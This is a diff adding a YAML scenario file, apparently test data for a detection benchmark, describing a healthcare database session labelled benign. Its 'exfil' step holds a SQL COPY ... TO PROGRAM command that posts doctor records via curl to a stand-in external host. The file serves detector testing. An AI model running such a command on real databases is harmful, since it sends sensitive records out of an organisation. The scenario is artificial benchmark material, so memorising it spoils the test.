@@ -1,0 +1,32 @@
+scenario_id: gen_healthcare_64_sql_injection_ben_1859b
+family_id: gen_healthcare_64_sql_injection_fam_1859
+domain: healthcare
+time_of_day: '13:40'
+default_class: benign
+rule_engine_relationship: agrees
+sessions:
+- session_label: inject
+  role: research_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: probe
+    sql: SELECT doctor_id, specialty FROM doctors WHERE patient_id = 78099
+  - step_id: exfil
+    sql: COPY (SELECT doctor_id, specialty FROM doctors WHERE department_id = '1')
+      TO PROGRAM 'curl -sX POST https://sync.partner-mirror.example/ingest -d @-'
+    connects_to:
+      ip: 203.0.113.129
+      port: 8443
+matched_pair_id: gen_healthcare_64_sql_injection_pair_1859
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
